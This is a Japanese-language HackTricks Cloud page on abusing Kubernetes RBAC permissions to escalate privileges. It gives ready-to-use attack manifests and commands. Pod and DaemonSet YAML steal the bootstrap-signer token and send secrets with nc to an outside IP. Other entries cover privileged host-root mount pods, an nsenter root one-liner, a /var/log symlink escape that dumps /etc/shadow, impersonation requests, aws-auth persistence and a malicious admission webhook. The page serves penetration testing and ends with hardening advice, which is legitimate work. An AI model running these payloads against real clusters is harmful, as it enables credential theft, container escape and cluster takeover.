# KubernetesにおけるRoles/ClusterRolesの悪用

{% hint style="success" %}
AWSハッキングの学習と実践：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングの学習と実践：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して**ハッキングテクニックを共有**してください。

</details>
{% endhint %}

ここでは、潜在的に危険なRolesおよびClusterRolesの構成を見つけることができます。\
`kubectl api-resources`を使用して、すべてのサポートされているリソースを取得できることを覚えておいてください。

## 特権昇格

Kubernetesにおいて、**異なる権限を持つ別の主体へのアクセス**を取得する技術として言及される特権昇格では、基本的に**4つの主要な技術**があります：

* Kubernetesクラスタ内または外部クラウドで、より高い権限を持つ他のユーザー/グループ/SAsを**偽装**できること
* Kubernetesクラスタ内または外部クラウドで、より高い権限を持つSAsを**見つけたりアタッチしたりできる**ように**ポッドを作成/パッチ/実行**できること
* SAsのトークンがシークレットとして保存されているため、**シークレットを読み取る**ことができること
* コンテナからノードに**脱出**できることで、ノードで実行されているコンテナのすべてのシークレット、ノードの資格情報、およびノードが実行されているクラウド内でのノードの権限を盗むことができること
* ポッドで**ポートフォワードを実行**できる能力も言及に値する第5の技術であり、そのポッド内の興味深いリソースにアクセスできるかもしれない

### 任意のリソースまたは動詞へのアクセス（ワイルドカード）

**ワイルドカード (\*)は、任意のリソースに対する任意の動詞の権限を与えます**。管理者によって使用されます。ClusterRole内では、攻撃者がクラスタ内の任意のネームスペースを悪用できることを意味します。
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### 特定の動詞を使用して任意のリソースにアクセス

RBACでは、特定の権限には重大なリスクが伴います：

1. **`create`:** 任意のクラスタリソースを作成する権限を付与し、特権昇格のリスクがあります。
2. **`list`:** すべてのリソースをリストすることができ、機密データが漏洩する可能性があります。
3. **`get`:** サービスアカウントからシークレットにアクセスすることを許可し、セキュリティ上の脅威となります。
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - トークンの盗み取り

ポッドを作成する権限を持つ攻撃者は、特権付きサービスアカウントをポッドにアタッチし、トークンを盗み取ってサービスアカウントになりすますことができます。これにより、特権が昇格します

攻撃者にトークンを送信する`bootstrap-signer`サービスアカウントのトークンを盗むポッドの例：
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Podの作成と脱出

以下は、コンテナが持つことができるすべての特権を示しています：

- **特権アクセス**（保護を無効にし、機能を設定する）
- 特権を昇格させるのに役立つ**名前空間hostIPCとhostPidを無効にする**
- ノードのクラウド特権を盗むためのアクセスを提供し、ネットワークへのアクセスを向上させる**hostNetwork名前空間を無効にする**
- コンテナ内に**ホストの/**をマウントする
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

次のコマンドでPodを作成します：
```bash
kubectl --token $token create -f mount_root.yaml
```
一行から、[このツイート](https://twitter.com/mauilion/status/1129468485480751104)といくつかの追加を含めて:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
#### ステルス

おそらく、より**ステルス**になりたいです。前のテンプレートで言及された特権の一部だけを有効にしてポッドを作成した場合にアクセスできるものを見ることができます：

- **特権 + hostPID**
- **特権のみ**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_前述の特権を持つポッドの構成を作成/悪用する例は、[_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) で見つけることができます_

### ポッドの作成 - クラウドへの移行

**ポッド**（および必要に応じて**サービスアカウント**）を**作成**できる場合、**クラウド環境で特権を取得**することができるかもしれません。その後、**ポッドまたはサービスアカウントにクラウドロールを割り当て**、アクセスすることができます。\
さらに、**ホストネットワーク名前空間を持つポッドを作成**できる場合、**ノード**インスタンスの**IAMロールを盗む**ことができます。

詳細については、次を確認してください：

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **デプロイメント、デーモンセット、ステートフルセット、レプリケーションコントローラ、レプリカセット、ジョブ、およびクーロンジョブの作成/パッチ**

これらの権限を悪用して、前述の例のように新しいポッドを作成し、特権を確立することが可能です。

次のyamlは、**デーモンセットを作成し、ポッド内のSAのトークンを外部に持ち出します**：
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`**は、**ポッド内のシェルでコマンドを実行**するために使用されるKubernetesのリソースです。これにより、**コンテナ内でコマンドを実行したり、シェルを取得したり**することができます。

したがって、**ポッド内に入り、SAのトークンを盗むことが可能**であり、特権を持つポッドに入り、ノードに脱出してノード内のすべてのポッドのトークンを盗み、ノードを悪用することができます。
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### ポートフォワード

この権限は、**1つのローカルポートを指定されたポッド内の1つのポートに転送する**ことを可能にします。これは、ポッド内で実行されているアプリケーションを簡単にデバッグできるようにするためのものですが、攻撃者はそれを悪用して、ポッド内の興味深い（例：DB）や脆弱なアプリケーション（Web？）にアクセスすることがあります。
```
kubectl port-forward pod/mypod 5000:5000
```
### ホスト書き込み可能 /var/log/ エスケープ

[**この研究で示されているように**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)、ホストの `/var/log/` ディレクトリがマウントされた **ポッドにアクセスまたは作成** できる場合、**コンテナから脱出** できます。\
これは基本的に、**Kube-API がコンテナのログを取得**しようとするとき（`kubectl logs <pod>` を使用）、**Kubelet** サービスの `/logs/` エンドポイントを使用してポッドの `0.log` ファイルを要求するためです。\
Kubelet サービスは `/logs/` エンドポイントを公開しており、これは基本的にコンテナの `/var/log` ファイルシステムを公開しています。

したがって、コンテナの **/var/log/ フォルダに書き込みアクセス権** がある攻撃者は、次の2つの方法でこの動作を悪用できます：

* 通常は `/var/logs/pods/namespace_pod_uid/container/0.log` にあるコンテナの `0.log` ファイルを **`/etc/shadow` を指すシンボリックリンク** に変更します。その後、次のようにしてホストの shadow ファイルを持ち出すことができます：
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* 攻撃者が**`nodes/log`を読む権限を持つ**プリンシパルを制御している場合、`/host-mounted/var/log/sym`に**シンボリックリンク**を作成し、**`https://<gateway>:10250/logs/sym/`にアクセスすると、ホストのルート**ファイルシステムがリストされます（シンボリックリンクを変更するとファイルにアクセスできる場合があります）。
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**実験室と自動化されたエクスプロイトは** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### readOnly 保護のバイパス <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

もし運が良ければ、非常に特権のある `CAP_SYS_ADMIN` 機能が利用可能であれば、フォルダを単に rw で再マウントすることができます。
```bash
mount -o rw,remount /hostlogs/
```
#### hostPathのreadOnly保護をバイパスする <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**この研究**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)に記載されているように、この保護をバイパスすることが可能です。
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
次のようにして以前のもののようなエスケープを防ぐことを意図していました。代わりにhostPath マウントを使用せずに、PersistentVolume と PersistentVolumeClaim を使用して、ホストのフォルダをコンテナに書き込みアクセスでマウントします。
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **特権アカウントのなりすまし**

[**ユーザーなりすまし**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) 権限を持つと、攻撃者は特権アカウントになりすますことができます。

単に`kubectl`コマンドでパラメータ `--as=<username>` を使用してユーザーになりすまし、または `--as-group=<group>` を使用してグループになりすますだけです。
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
または、REST API を使用します:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### シークレットのリスト表示

**シークレットのリスト表示権限は、攻撃者が実際にシークレットを読むことを可能にする** REST API エンドポイントへのアクセス:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### シークレットの読み取り - トークンIDの総当たり攻撃

読み取り権限を持つ攻撃者は、シークレットの正確な名前が必要ですが、より広範な**シークレットの一覧表示**権限とは異なり、脆弱性がまだ存在します。システム内のデフォルトサービスアカウントは列挙可能であり、それぞれがシークレットに関連付けられています。これらのシークレットは、静的な接頭辞に続くランダムな5文字の英数字トークン（特定の文字を除く）の名前構造を持っています。[ソースコード](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)によると、トークンは制限された27文字のセット（`bcdfghjklmnpqrstvwxz2456789`）から生成されます。

この制限により、合計可能な組み合わせが14,348,907（27の5乗）に減少します。その結果、攻撃者は時間の経過とともにトークンを推測するために総当たり攻撃を実行し、機密性の高いサービスアカウントへのアクセスによって特権昇格を引き起こす可能性があります。

### 証明書署名リクエスト

リソース`certificatesigningrequests`内に**`create`**の動詞がある場合（または少なくとも`certificatesigningrequests/nodeClient`にある場合）、**新しいノードの**新しいCeSRを**作成**できます。

[ドキュメントによると、これらのリクエストを自動承認することが可能です](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/)。その場合、**追加の権限は必要ありません**。そうでない場合、リクエストを承認できる必要があり、`certificatesigningrequests/approval`内の更新と`signers`内の`<signerNameDomain>/<signerNamePath>`または`<signerNameDomain>/*`での`approve`が必要です。

必要なすべての権限を持つ**ロールの例**は次のとおりです：
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
したがって、新しいノードCSRが承認されたら、ノードの特別な権限を悪用してシークレットを盗み、特権を昇格させることができます。

[**この投稿**](https://www.4armed.com/blog/hacking-kubelet-on-gke/)と[**この投稿**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/)では、GKE K8s TLSブートストラップ構成が**自動署名**で構成され、新しいK8sノードの資格情報を生成してそれらを悪用して特権を昇格させる方法が悪用されています。\
もしあなたが**言及された権限を持っている場合、同じことができます**。最初の例は、新しいノードがそれにマウントされたコンテナ内のシークレットにアクセスするのを防ぐエラーをバイパスします。なぜなら、**ノードはそれにマウントされたコンテナのシークレットにのみアクセスできる**からです。

これをバイパスする方法は、単に**興味深いシークレットをマウントしたコンテナがあるノード名のノード資格情報を作成する**ことです（ただし、最初の投稿でその方法を確認してください）:
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

EKS（AWS内にいる必要があります）クラスターのkube-systemネームスペース内の**`configmaps`**を変更できる主体は、**aws-auth** configmapを上書きすることでクラスター管理者権限を取得できます。\
必要な動詞は**`update`**と**`patch`**です。configmapが作成されていない場合は**`create`**が必要です：
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
**他のアカウント**からユーザーにアクセス権を与えるために**`aws-auth`**を**永続化**に使用できます。

ただし、`aws --profile other_account eks update-kubeconfig --name <cluster-name>` は**異なるアカウントからは機能しません**。しかし、実際には `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` は、クラスターのARNを名前の代わりに入力すると機能します。\
`kubectl`を機能させるには、**被害者のkubeconfigを構成**し、aws exec argsに `--profile other_account_role` を追加して、kubectlが他のアカウントプロファイルを使用してトークンを取得し、AWSに接続するようにします。
{% endhint %}

### GKEでの昇格

**GCPプリンシパルにK8s権限を割り当てる方法は2つ**あります。いずれの場合も、プリンシパルはクラスターにアクセスするための資格情報を収集するために**`container.clusters.get`**権限も必要です。そうでない場合は、**独自のkubectl構成ファイルを生成する必要があります**（次のリンクを参照）。

{% hint style="warning" %}
K8s APIエンドポイントにアクセスする際に、**GCP認証トークンが送信されます**。その後、GCPはK8s APIエンドポイントを介して、まずプリンシパル（メールアドレスで）がクラスター内でアクセス権を持っているかどうかを確認し、次にGCP IAMを介してアクセス権を持っているかどうかを確認します。\
いずれかが**true**であれば、応答されます。そうでない場合は、**GCP IAMを介して権限を付与するように**というエラーが表示されます。
{% endhint %}

その後、最初の方法は**GCP IAM**を使用することで、K8s権限には**それに相当するGCP IAM権限**があり、プリンシパルがそれを持っていれば使用できます。

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

2番目の方法は、クラスター内で**K8s権限を割り当てる**ことで、ユーザーを**メールアドレス**で識別します（GCPサービスアカウントを含む）。

### サービスアカウントトークンの作成

**TokenRequests** (`serviceaccounts/token`を作成できるプリンシパル)。K8s APIエンドポイントにアクセスする際にSAs（[ここ](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)の情報）。

### ephemeralcontainers

**`pods/ephemeralcontainers`**を**`update`**または**`patch`**できるプリンシパルは、**他のポッドでコードを実行**し、特権のあるsecurityContextを持つephemeralコンテナを追加することで、**ノードから脱出**する可能性があります。

### ValidatingWebhookConfigurationsまたはMutatingWebhookConfigurations

`validatingwebhookconfigurations`または`mutatingwebhookconfigurations`の上に`create`、`update`、または`patch`のいずれかの動詞を持つプリンシパルは、**そのようなwebhookconfigurationsの作成**が可能になり、**特権を昇格**することができるかもしれません。

[`mutatingwebhookconfigurations`の例は、この投稿のこのセクションを参照してください](./#malicious-admission-controller)。

### 昇格

次のセクションで読むことができるように、[**組み込み特権昇格防止**](./#built-in-privileged-escalation-prevention)では、プリンシパルは新しい権限を持っていない限り、ロールまたはクラスターロールを更新または作成することはできません。**`roles`**または**`clusterroles`**の上に**`escalate`**動詞を持っている場合は、自分自身にそれらの新しい権限を持たせることなく、新しいロールやクラスターロールを更新/作成できます。

### ノードプロキシ

**`nodes/proxy`**サブリソースにアクセス権を持つプリンシパルは、Kubelet APIを介して**ポッドでコードを実行**できます（[こちら](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)による）。このページでKubelet認証に関する詳細情報を確認できます：

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Kubelet APIに**認証された状態でRCEを取得する例はこちら**です](../pentesting-kubernetes-services/#kubelet-rce)。

### ポッドの削除 + スケジュールされていないノード

**ポッドを削除**できるプリンシパル（`pods`リソース上の`delete`動詞）、または**ポッドを追い出す**ことができるプリンシパル（`pods/eviction`リソース上の`create`動詞）、または**ポッドのステータスを変更**できるプリンシパル（`pods/status`へのアクセス）および**他のノードをスケジュールできる**プリンシパル（`nodes/status`へのアクセス）または**ノードを削除**できるプリンシパル（`nodes`リソース上の`delete`動詞）が、ポッドを制御できる場合、他のノードからポッドを**盗む**ことができ、それらのポッドのトークンを**盗む**ことができます。それらのポッドは**侵害されたノード**で**実行**されます。

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### サービスの状態（CVE-2020-8554）

**`services/status`** を**変更**できる主体は、`status.loadBalancer.ingress.ip` フィールドを設定して、**修正されていないCVE-2020-8554**を悪用し、クラスターに対する**MiTM攻撃**を実行できます。CVE-2020-8554のほとんどの緩和策は、ExternalIPサービスを防ぐだけです（[**こちら**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)による）。

### ノードとポッドの状態

`nodes/status`または`pods/status`に対する**`update`**または**`patch`**権限を持つ主体は、スケジューリング制約に影響を与えるためにラベルを変更できます。

## ビルトイン特権昇格防止

Kubernetesには、特権昇格を防ぐ[ビルトインメカニズム](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention)があります。

このシステムは、**ユーザーが役割やロールバインディングを変更して特権を昇格させることを防ぐ**ことを保証します。このルールの強制はAPIレベルで行われ、RBAC認可者が非アクティブであっても保護を提供します。

このルールは、**ユーザーが役割を作成または更新できるのは、その役割が持つすべての権限を持っている場合に限る**ことを規定しています。さらに、ユーザーの既存の権限の範囲は、作成または変更しようとしている役割の範囲と一致している必要があります。ClusterRolesの場合はクラスタ全体、Rolesの場合は同じ名前空間（またはクラスタ全体）に限定されます。

{% hint style="warning" %}
前述のルールには例外があります。主体が**`roles`**または**`clusterroles`**に対して**`escalate`**動詞を持っている場合、その主体は自身に権限がなくても役割やクラスタロールの特権を増やすことができます。
{% endhint %}

### **RoleBindings/ClusterRoleBindingsの取得とパッチ**

{% hint style="danger" %}
**以前はこのテクニックが機能していたようですが、私のテストによると、前のセクションで説明した理由と同じ理由でもう機能していません。すでに権限がない場合、自分自身または別のSAに特権を与えるためにrolebindingを作成/変更することはできません。**
{% endhint %}

Rolebindingsを作成する特権は、ユーザーが**サービスアカウントに役割をバインド**することを可能にします。この特権は、**ユーザーが危険にさらされたサービスアカウントに管理者特権をバインドすることを許可**するため、特権昇格につながる可能性があります。

## その他の攻撃

### サイドカープロキシアプリ

デフォルトでは、ポッド間の通信には暗号化がありません。相互認証、双方向、ポッド間。

#### サイドカープロキシアプリを作成<a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

あなたの.yamlを作成
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
編集して、コメントを外した行を追加してください。
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
プロキシのログを参照します：
```bash
kubectl logs app -C proxy
```
詳細はこちら：[https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### 悪意のあるアドミッションコントローラ

アドミッションコントローラは、オブジェクトの永続化前にKubernetes APIサーバーへのリクエストを**インターセプト**しますが、リクエストが**認証**された後であり、**承認**された後です。

攻撃者がなんらかの方法で**Mutationg Admission Controllerを注入**できれば、**すでに認証されたリクエストを変更**できるようになります。潜在的に権限昇格が可能になり、クラスターにより一般的に永続化できるようになります。

**例** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
状態を確認して、準備ができているかどうかを確認します:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

その後、新しいポッドをデプロイします：
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
以下のいずれかのクエリでイメージ名を確認してください。`ErrImagePull`エラーが表示される場合：
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

上の画像で見られるように、`nginx` イメージを実行しようとしましたが、最終的に実行されたイメージは `rewanthtammana/malicious-image` です。何が起こったのでしょうか！？

#### 技術的詳細 <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` スクリプトは、ミューテーティングウェブフックアドミッションコントローラを確立し、その構成行に指定されたように Kubernetes API へのリクエストを変更し、観察される結果に影響を与えます。
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
## 最初のコンテナイメージをすべてのポッドで`rewanthtammana/malicious-image`に置き換えます。

## OPA Gatekeeper バイパス

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## ベストプラクティス

### **サービスアカウントトークンの自動マウントの無効化**

* **ポッドとサービスアカウント**: デフォルトでは、ポッドはサービスアカウントトークンをマウントします。セキュリティを強化するために、Kubernetesはこの自動マウント機能の無効化を許可しています。
* **適用方法**: Kubernetesバージョン1.6以降では、サービスアカウントまたはポッドの構成で`automountServiceAccountToken: false`を設定します。

### **RoleBindings/ClusterRoleBindings での制限付きユーザー割り当て**

* **選択的な包含**: RoleBindingsまたはClusterRoleBindingsには必要なユーザーのみが含まれるようにします。不要なユーザーを定期的に監査して削除し、セキュリティを強化します。

### **クラスタ全体のロールよりも名前空間固有のロールを使用**

* **Roles vs. ClusterRoles**: クラスタ全体に適用されるClusterRolesとClusterRoleBindingsではなく、名前空間固有の権限にはRolesとRoleBindingsを使用することをお勧めします。このアプローチはより細かい制御を提供し、権限のスコープを制限します。

### **自動化ツールの使用**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **参考文献**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
AWSハッキングの学習と実践:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングの学習と実践: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**または**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出してください。

</details>
{% endhint %}
